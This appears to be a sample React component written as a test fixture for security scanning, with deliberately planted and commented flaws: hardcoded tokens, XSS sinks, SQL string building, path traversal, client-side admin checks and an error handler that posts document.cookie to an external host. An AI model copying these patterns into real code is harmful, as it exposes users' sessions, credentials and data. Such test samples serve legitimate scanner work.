// Another sample JavaScript file with different security issues
// React-like component with security vulnerabilities

import React from 'react';
import axios from 'axios';

// Configuration with hardcoded secrets
const config = {
    apiKey: 'AIzaSyDOCAbC123',
    authDomain: 'myapp.firebaseapp.com',
    projectId: 'my-project-123',
    githubToken: 'ghp_1234567890abcdef1234567890abcdef123456'
};

// JWT token handling
let currentToken = null;

class UserComponent extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            users: [],
            currentUser: null,
            adminPanel: false
        };
    }

    // Vulnerable: XSS through dangerouslySetInnerHTML
    renderUserBio(bio) {
        return <div dangerouslySetInnerHTML={{__html: bio}} />;
    }

    // Authentication function
    async authenticateUser(username, password) {
        // Vulnerable: Credentials in URL parameters
        const authUrl = `/api/auth?username=${username}&password=${password}`;
        
        try {
            const response = await axios.get(authUrl);
            currentToken = response.data.token;
            
            // Vulnerable: Token stored in localStorage
            localStorage.setItem('authToken', currentToken);
            
            // Vulnerable: Admin check on client side
            if (response.data.role === 'admin') {
                this.setState({adminPanel: true});
            }
            
            return response.data;
        } catch (error) {
            console.error('Auth failed:', error);
        }
    }

    // Data fetching with potential CSRF
    async fetchUserData(userId) {
        const userEndpoint = `/api/users/${userId}`;
        
        // Vulnerable: No CSRF protection
        return axios.get(userEndpoint, {
            headers: {
                'Authorization': `Bearer ${currentToken}`,
                'X-API-Key': config.apiKey
            }
        });
    }

    // Message posting function
    async postMessage(message, recipientId) {
        // Vulnerable: No input sanitization
        const payload = {
            content: message,
            recipient: recipientId,
            timestamp: new Date().toISOString()
        };

        // Vulnerable endpoint
        const messageEndpoint = '/api/messages/send';
        
        return axios.post(messageEndpoint, payload);
    }

    // File download function
    downloadFile(fileId, filename) {
        // Vulnerable: Path traversal possibility
        const downloadUrl = `/api/files/download/${fileId}?filename=${filename}`;
        window.location.href = downloadUrl;
    }

    // Admin functions
    deleteAllUsers() {
        // Vulnerable: Mass deletion without proper authorization
        if (this.state.adminPanel) {
            axios.delete('/api/admin/users/deleteAll');
        }
    }

    // SQL query builder (client-side)
    buildUserQuery(filters) {
        // Vulnerable: SQL injection potential
        let query = 'SELECT * FROM users WHERE 1=1';
        
        if (filters.name) {
            query += ` AND name = '${filters.name}'`;
        }
        
        if (filters.email) {
            query += ` AND email = '${filters.email}'`;
        }
        
        return query;
    }

    // Event handlers
    handleUserInput(event) {
        const userInput = event.target.value;
        
        // Vulnerable: Direct DOM manipulation with user input
        document.getElementById('output').innerHTML = `Hello ${userInput}!`;
    }

    // WebSocket handling
    initializeWebSocket() {
        const ws = new WebSocket('ws://example.com/chat');
        
        ws.onmessage = (event) => {
            // Vulnerable: No message validation
            const message = JSON.parse(event.data);
            document.body.innerHTML += `<div>${message.content}</div>`;
        };
    }

    render() {
        return (
            <div>
                <h1>User Management</h1>
                {this.state.adminPanel && (
                    <div>
                        <button onClick={() => this.deleteAllUsers()}>
                            Delete All Users
                        </button>
                    </div>
                )}
            </div>
        );
    }
}

// Export configuration (exposing secrets)
export { config, UserComponent };

// Global error handler
window.onerror = function(msg, url, line, col, error) {
    // Vulnerable: Sending error details to external service
    fetch('https://external-logging.com/errors', {
        method: 'POST',
        body: JSON.stringify({
            message: msg,
            url: url,
            line: line,
            userAgent: navigator.userAgent,
            cookies: document.cookie
        })
    });
};
